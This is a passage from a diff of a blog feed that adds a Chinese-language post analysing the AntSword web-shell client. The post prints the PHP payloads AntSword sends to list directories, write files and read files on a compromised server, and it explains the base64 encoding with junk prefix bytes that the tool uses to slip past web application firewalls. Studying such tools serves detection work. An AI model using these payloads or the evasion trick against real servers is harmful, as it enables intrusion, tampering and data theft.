<span class="variable">$N</span> . <span class="variable">$R</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$M</span> . <span class="variable">$L</span>;</span><br><span class="line">        @closedir(<span class="variable">$F</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>简单的遍历目录下的所有文件/文件夹，并回显</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623140641090.png" alt="image-20210623140641090"></p>
+<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="创建文件-写文件"><a href="#创建文件-写文件" class="headerlink" title="创建文件/写文件"></a>创建文件/写文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> @fwrite(fopen(base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o930dff714d3c9&quot;</span>], <span class="number">2</span>)), <span class="string">&quot;w&quot;</span>), base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o18205bef6e997&quot;</span>], <span class="number">2</span>))) ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>默认写入的数据为 <code>#Halo AntSword!</code></p>
+<h4 id="打开文件-读取文件"><a href="#打开文件-读取文件" class="headerlink" title="打开文件/读取文件"></a>打开文件/读取文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$F</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o930dff714d3c9&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$P</span> = @fopen(<span class="variable">$F</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(@fread(<span class="variable">$P</span>, filesize(<span class="variable">$F</span>) ? filesize(<span class="variable">$F</span>) : <span class="number">4096</span>));</span><br><span class="line">    @fclose(<span class="variable">$P</span>);;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>蚁剑会将 PHP 代码传入密码参数（上面为 cmd） 中，并且将需要用到的参数以随机字符串的变量名、base64 加密，并在前面加入两个字节的垃圾数据传入，由此来绕过一些 waf（在base64 这一层解码不出来）</p>
+<p>但是为什么 PHP 代码明文传输仍然存在一定的疑惑</p>
+]]></content>
+      <categories>
+        <category>tools</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>tools</tag>
       </tags>
   </entry>
   <entry>
